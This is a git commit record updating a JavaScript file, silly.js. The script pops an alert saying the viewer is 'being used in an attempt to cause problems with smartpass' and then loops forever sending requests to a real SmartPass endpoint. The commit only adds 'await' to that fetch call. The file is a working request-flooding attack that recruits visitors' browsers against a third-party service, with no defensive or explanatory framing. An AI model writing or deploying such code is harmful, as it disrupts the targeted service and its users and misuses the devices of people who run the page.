0cbe2dcc929fc0b0e5020163effb1d55d27c93f2
CampBatt <120993447+CampBatt@users.noreply.github.com>
2024-03-03 00:21:26 -0500

    Update silly.js

--- silly.js
+++ silly.js
@@ -1,4 +1,4 @@
 alert("you are being used in an attempt to cause problems with smartpass :)")
 while (true){
-    fetch("https://app.smartpass.app/main/passes")
+    await fetch("https://app.smartpass.app/main/passes");
 }
